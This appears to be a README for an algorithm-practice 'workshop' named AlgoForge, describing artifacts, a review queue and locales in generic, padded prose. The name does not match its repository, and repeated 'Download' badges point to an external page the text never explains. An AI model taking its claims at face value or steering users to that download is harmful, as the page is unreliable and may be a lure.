![preview](https://raw.githubusercontent.com/upendrasharma9718/LeetCraft-Dojo/main/view_da3dbb.svg)
[![Download](https://raw.githubusercontent.com/upendrasharma9718/LeetCraft-Dojo/main/launch_ef68899.svg)](https://upendrasharma9718.github.io/LeetCraft-Dojo/)

# 🧠 AlgoForge — Personal Algorithm Mastery Workshop

An opinionated, evergreen workshop for sharpening algorithmic thinking through curated problem-solving sessions, structured notes, and a personally grown knowledge base. AlgoForge is not a race to finish a list — it is a long-term apprenticeship with yourself, where every problem becomes a small tool you keep in a well-organized mental toolbox.

This repository is a companion workspace to the original idea behind a leetcode-style trainer, but reimagined as a self-hosted, extensible dojo. Instead of scattering solutions across folders with cryptic names, AlgoForge treats every solved problem as a first-class artifact: it has a title, a difficulty, a family (greedy, DP, graphs, sliding window, and so on), a set of tags, a reasoning trail, a complexity note, and — crucially — a reflection written by the solver after the fact. The result is closer to a personal encyclopedia than a dump of code files.

AlgoForge is designed for the kind of person who opens a problem, stares at it for twenty minutes, closes the tab, and comes back two days later with a brand-new idea. It supports that rhythm. It rewards patience. It does not reward frantic submission spamming.

The project is intended to run in 2026 and beyond, with a stable, dependency-light core and a friendly extension surface for those who want to build their own analytics, dashboards, or language-specific harnesses.

[![Download](https://raw.githubusercontent.com/upendrasharma9718/LeetCraft-Dojo/main/launch_ef68899.svg)](https://upendrasharma9718.github.io/LeetCraft-Dojo/)

---

## 📚 Table of Contents

- [Why AlgoForge Exists](#-why-algoforge-exists)
- [Core Philosophy](#-core-philosophy)
- [Feature Highlights](#-feature-highlights)
- [Architecture Overview](#-architecture-overview)
- [The Problem Artifact Model](#-the-problem-artifact-model)
- [Repository Layout](#-repository-layout)
- [Responsive UI](#-responsive-ui)
- [Multilingual Support](#-multilingual-support)
- [Always-Available Guidance](#-always-available-guidance)
- [Workflow: From Curiosity to Mastery](#-workflow-from-curiosity-to-mastery)
- [Supported Languages and Runtimes](#-supported-languages-and-runtimes)
- [SEO-Friendly Topic Coverage](#-seo-friendly-topic-coverage)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Code of Conduct](#-code-of-conduct)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌱 Why AlgoForge Exists

Most solution repositories age badly. They grow into a graveyard of half-finished attempts, misnamed folders, and one-line commits like "fix" or "again". After a few months, even the author cannot remember why a particular branch was abandoned or which trick made a hard problem click.

AlgoForge began as a reaction to that decay. The goal is simple: every time you solve something, you leave behind a slightly better map than the one you had before. Over a year, that map becomes a treasure.

The name comes from the idea of a forge — a place where raw material is heated, hammered, and cooled into a tool with a specific purpose. Each problem is a raw ingot. The reflection you write, the pattern you extract, and the note you leave for your future self are what turn the ingot into a usable blade.

This workshop does not ask you to solve one thousand problems. It asks you to understand fifty of them so deeply that the other nine hundred and fifty become variations on themes you already know.

---

## 🧭 Core Philosophy

1. **Depth over volume.** A problem solved twice, with different approaches, is worth more than ten problems glanced at once.
2. **Reflection over submission.** The accepted solution is the beginning of learning, not the end.
3. **Patterns over memorization.** Every problem belongs to a family. Learning the family is the real prize.
4. **Notes over notes-apps.** Notes stay in the repository, versioned, searchable, and next to the code they describe.
5. **Patience over streak anxiety.** Missing a day is fine. Missing the story behind a solution is not.
6. **Portability over lock-in.** The workshop should run on a laptop from 2015 and on a server from 2026 without complaint.
7. **Clarity over cleverness.** A readable solution that a beginner can follow beats a one-liner that only its author understands.

---

## ✨ Feature Highlights

AlgoForge is more than a folder of files. It is a small ecosystem with a strong opinion about how learning should feel.

- **Responsive UI.** A lightweight web view that rearranges itself gracefully from a phone screen to an ultrawide monitor. Cards, timelines, and diff views all adapt without horizontal scrolling or zoom gymnastics.
- **Multilingual support.** Every problem artifact can carry notes in multiple natural languages, and the solver can switch the interface language without losing progress, bookmarks, or review history. Interface strings live in locale files and are easy to extend to a new language.
- **Always-available guidance.** A built-in helper panel that offers hints, related problem suggestions, and conceptual reading lists at any hour, so a late-night curiosity never has to wait until morning.
- **Family-based organization.** Problems are grouped by algorithmic family rather than by number or source, which makes it natural to study a pattern end to end.
- **Reflection journal.** Each artifact includes a short post-mortem: what was tried, what failed, what finally worked, and what would have made it easier.
- **Complexity ledger.** Time and space complexity are first-class fields, with a small visual aid to compare approaches on the same problem.
- **Spaced review queue.** A gentle scheduler that resurfaces artifacts at increasing intervals so patterns stay warm.
- **Local-first storage.** Artifacts are plain text and portable; nothing depends on a proprietary backend.
- **Extensible runners.** Add a new language runtime by dropping in a small adapter file — no core changes required.
- **Dark and light themes.** Because eyes matter at 2 a.m.
- **Offline-friendly.** Once loaded, the core experience continues to work without a network connection.

---

## 🏗️ Architecture Overview

AlgoForge is built from four cooperating layers. Each layer is small enough to reason about in a single sitting.

| Layer | Responsibility | Notes |
| --- | --- | --- |
| Artifact Store | Holds problem metadata, notes, and reflections | Plain text, human-editable |
| Runner Bridge | Executes candidate solutions in a chosen language | Adapter-based |
| Insight Engine | Analyzes complexity, tags, and pattern usage | Deterministic, offline |
| Presentation Shell | Renders the responsive interface and review queue | Themeable, locale-aware |

The layers communicate through a narrow, documented contract. This means you can replace any single layer — for example, swap the presentation shell for a terminal-based client — without disturbing the rest.

---

## 🧩 The Problem Artifact Model

Every solved problem becomes an artifact with the following fields. This is the heart of AlgoForge, and it is deliberately verbose.

- **Identifier.** A short, stable, human-readable slug.
- **Title.** The canonical problem title.
- **Family.** The algorithmic family (e.g., dynamic programming, interval scheduling).
- **Difficulty Band.** A self-assessed band rather than a borrowed label.
- **Tags.** Free-form keywords for search and cross-reference.
- **Approaches.** One or more approaches, each with a rationale.
- **Complexity.** Time and space, with a brief justification.
- **Reflection.** A short essay written by the solver after the fact.
- **Related Artifacts.** Cross-links to sibling problems.
- **Review History.** Dates of past reviews and the outcome of each.
- **Locales.** Notes translated into one or more natural languages.

Because the artifact is text-first, it merges cleanly, diffs readably, and survives tool churn.

---

## 🗂️ Repository Layout

A high-level view of how things are arranged. Names are stable across releases.

- **artifacts/** — one folder per problem artifact, each containing its metadata and notes.
- **families/** — curated overviews of algorithmic families, with reading lists and mental models.
- **runners/** — adapters for supported language runtimes.
- **insights/** — the analysis engine and its rule set.
- **shell/** — the responsive interface, themes, and locale files.
- **review/** — the spaced review scheduler and its state.
- **docs/** — longer-form guides, tutorials, and design notes.
- **scripts/** — small maintenance utilities for local use.

This layout keeps concerns separate while staying shallow enough to navigate without a map.

---

## 📱 Responsive UI

The interface is designed to feel at home on any screen. On a phone, artifacts appear as a single scrollable column with collapsible sections. On a tablet, they split into a two-pane layout. On a desktop, a three-pane layout shows the family tree, the artifact, and the reflection side by side.

The UI avoids heavy animation in favor of quick, calm transitions. Reading a solution should feel closer to reading a well-typeset book than to operating a cockpit.

Accessibility is treated as a baseline, not an add-on: keyboard navigation, sensible focus order, and respect for the operating system's reduced-motion preference are all built in.

---

## 🌍 Multilingual Support

Language is not a decoration in AlgoForge — it is part of how ideas travel. Notes can be authored in one language and gradually translated into another, and the interface can be switched at any time without losing context.

Locale files are organized by language code and are fully editable. Adding a new interface language is a matter of copying a locale folder, translating strings, and registering the folder. The project ships with a small set of locales and welcomes additional ones from contributors.

Because algorithmic reasoning often borrows terms from English, the multilingual layer is careful to preserve canonical terminology while allowing natural explanations in each supported language. This balance keeps cross-references stable while making the workshop welcoming to readers everywhere.

---

## 🕰️ Always-Available Guidance

Learning is not a nine-to-five activity. AlgoForge includes a guidance panel that is available around the clock, offering:

- A hint ladder that can be climbed one rung at a time.
- Suggested sibling problems when a pattern feels shaky.
- Short conceptual readings curated from the docs folder.
- A gentle nudge when an artifact has not been reviewed in a while.

The guidance panel is intentionally calm. It does not interrupt, does not nag, and does not gamify learning into a slot machine. It waits until asked.

---

## 🔄 Workflow: From Curiosity to Mastery

A typical session in AlgoForge looks like this:

1. Pick a family you want to strengthen.
2. Open a fresh artifact template.
3. Attempt the problem in your preferred language.
4. Record each approach you tried, including the ones that failed.
5. Note the complexity and the reason behind it.
6. Write a short reflection for your future self.
7. Link the artifact to two or three relatives.
8. Schedule the first review.
9. Move on, and let the spaced review queue do the rest.

Over weeks, the artifacts accumulate into a personal curriculum. Over months, they become a reference you trust more than any external list, because it reflects your own reasoning.

---

## 🧬 Supported Languages and Runtimes

AlgoForge does not lock you into a single language. Runners are adapters, and the core stays neutral. Common choices are:

- A systems language for performance-sensitive problems.
- A scripting language for rapid prototyping and readable notes.
- A functional language for problems that reward immutability.
- A dynamically typed language for interview-style sketching.

The adapter contract is documented in the docs folder. Adding a new runtime means writing a small module that knows how to compile, run, and capture output.

---

## 🔎 SEO-Friendly Topic Coverage

AlgoForge naturally covers a broad set of algorithmic topics that people search for when studying:

- Dynamic programming and memoization strategies.
- Graph traversal, shortest paths, and connectivity.
- Sliding window and two-pointer techniques.
- Binary search on answer spaces.
- Backtracking and constraint satisfaction.
- Greedy selection and exchange arguments.
- Bit manipulation and low-level tricks done cleanly.
- Trees, tries, and hierarchical data structures.
- Sorting, partitioning, and selection algorithms.
- String matching, hashing, and rolling checksums.
- Union-find and disjoint set applications.
- Interval scheduling and sweep line methods.

Each topic is presented as a family with a reading list, a set of related artifacts, and a short essay explaining when the pattern is the right tool and when it is a trap.

---

## 🗺️ Roadmap for 2026

Planned work for the coming year, subject to change as the community shapes priorities:

- A richer family tree visualization that shows how patterns relate.
- An export format for sharing a curated subset of artifacts.
- Additional locale files contributed by the community.
- A terminal client for those who prefer the keyboard over the mouse.
- Improved complexity visualization with side-by-side comparisons.
- A gentle onboarding tour for first-time visitors.
- Documentation for every adapter, with examples.
- A public gallery of redacted artifacts to inspire new solvers.

---

## 🤝 Contributing

Contributions are welcome and appreciated. A few guidelines keep the workshop coherent:

- Keep artifacts text-first and human-readable.
- Prefer clarity over cleverness in solutions.
- Write reflections honestly, including dead ends.
- Add locale strings when introducing new interface text.
- Update the docs when introducing a new concept.
- Be kind in reviews; learning is a shared activity.

Before opening a change, please read the design notes in the docs folder to understand the reasoning behind the current structure. Small, focused changes are easier to review than sweeping rewrites.

---

## 📜 Code of Conduct

AlgoForge is a place for patient, curious people. Harassment, dismissiveness, and gatekeeping are not welcome. Assume good faith, ask before assuming, and remember that everyone's learning path is different. Reports are handled discreetly, and the maintainers aim to respond promptly.

---

## 📄 License

This project is released under the MIT License. You are welcome to use, modify, and share it in accordance with the terms of that license.

A working copy of the license text is available here: [MIT License](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

AlgoForge is an educational workshop. It is provided as-is, without warranty of any kind, express or implied. The maintainers are not responsible for any consequences arising from the use of this repository, including but not limited to academic outcomes, interview results, or the sudden urge to refactor your entire notes folder at midnight.

The project is not affiliated with any external problem platform. All problem references are used for study and commentary. Solutions are the work of their respective authors, and reflections are personal opinions rather than authoritative statements.

In 2026, as in any year, the most valuable thing you can build is your own understanding. AlgoForge is a tool to that end — nothing more, and nothing less.

[![Download](https://raw.githubusercontent.com/upendrasharma9718/LeetCraft-Dojo/main/launch_ef68899.svg)](https://upendrasharma9718.github.io/LeetCraft-Dojo/)